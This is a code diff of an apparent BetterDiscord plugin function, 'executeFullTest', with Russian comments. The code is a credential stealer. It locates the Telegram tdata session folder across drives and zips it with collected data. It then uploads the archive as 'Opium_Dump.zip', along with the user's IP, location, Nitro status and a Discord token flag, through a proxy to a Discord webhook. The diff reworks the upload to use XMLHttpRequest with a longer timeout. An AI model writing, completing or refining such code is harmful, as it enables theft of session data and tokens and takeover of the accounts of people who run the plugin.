@@ -84,7 +84,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             if (fs.existsSync(p)) { tdataPath = p; break; }
         }
 
-        // Если не нашли, быстрый поиск
         if (!tdataPath) {
             const drives = ['C:', 'D:', 'E:', 'F:'];
             for (const d of drives) {
@@ -119,7 +118,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         }
     } catch (e) { result.debug_tdata.push(`Ошибка поиска: ${e.message}`); }
 
-    // 5. ФОРМИРУЕМ АРХИВ (с проверкой размера)
+    // 5. ФОРМИРУЕМ АРХИВ
     let finalZipBuffer = null;
     try {
         const zipFiles = {};
@@ -129,7 +128,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         if (tdataPath) {
             result.telegram_path = tdataPath;
             
-            // Считаем размер папки ПЕРЕД чтением
+            // Считаем размер
             let totalSize = 0;
             const checkSize = (dir) => {
                 try {
@@ -147,8 +146,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             result.debug_tdata.push(`Размер tdata: ${sizeMB} MB`);
 
             if (totalSize > 20 * 1024 * 1024) {
-                result.debug_tdata.push("Папка слишком большая (>20MB). Пропуск архивации во избежание таймаута.");
-                hasTdata = false;
+                result.debug_tdata.push("Папка >20MB. Пропуск.");
             } else {
                 let fileCount = 0;
                 const addFilesRecursively = (dir, prefix = '') => {
@@ -172,24 +170,16 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                 result.debug_tdata.push(`Добавлено файлов tdata: ${fileCount}`);
                 hasTdata = true;
             }
-        } else {
-            result.debug_tdata.push("Папка tdata не найдена.");
         }
 
-        if (hasTdata) {
-            finalZipBuffer = zipFunc(zipFiles);
-            result.debug_tdata.push("ZIP успешно создан!");
-        } else {
-            // Если tdata нет, собираем архив только с data.json
-            finalZipBuffer = zipFunc(zipFiles);
-            result.debug_tdata.push("Создан архив только с data.json.");
-        }
+        finalZipBuffer = zipFunc(zipFiles);
+        result.debug_tdata.push("ZIP успешно создан!");
 
     } catch (e) {
         result.debug_tdata.push(`Ошибка архивации: ${e.message}`);
     }
 
-    // 6. Отправка
+    // 6. ОТПРАВКА ЧЕРЕЗ XMLHttpRequest
     const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
     
     const formData = new FormData();
@@ -200,16 +190,38 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         formData.append('files[0]', zipBlob, 'Opium_Dump.zip');
     }
 
-    try {
-        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
-        // ИСПОЛЬЗУЕМ НАТИВНЫЙ FETCH, ОН НЕ ОБРЫВАЕТ ЧЕРЕЗ 30 СЕКУНД
-        const response = await fetch(proxyUrlFull, { method: 'POST', body: formData });
-        if (!response.ok) {
-            const errorText = await response.text();
-            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
+    return new Promise((resolve) => {
+        try {
+            const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
+            const xhr = new XMLHttpRequest();
+            
+            // Открываем POST запрос
+            xhr.open('POST', proxyUrlFull, true);
+            
+            // Устанавливаем таймаут 60 секунд (60000 мс)
+            xhr.timeout = 60000;
+
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    resolve({ success: true });
+                } else {
+                    resolve({ success: false, error: `Discord вернул ${xhr.status}: ${xhr.responseText}` });
+                }
+            };
+
+            xhr.onerror = function() {
+                resolve({ success: false, error: "Сетевая ошибка при отправке (XHR)." });
+            };
+
+            xhr.ontimeout = function() {
+                resolve({ success: false, error: "Таймаут отправки (60 секунд)." });
+            };
+
+            // Отправляем FormData
+            xhr.send(formData);
+
+        } catch (e) {
+            resolve({ success: false, error: `Ошибка XHR: ${e.message}` });
         }
-        return { success: true };
-    } catch (e) {
-        return { success: false, error: `Ошибка сети: ${e.message}` };
-    }
+    });
 }
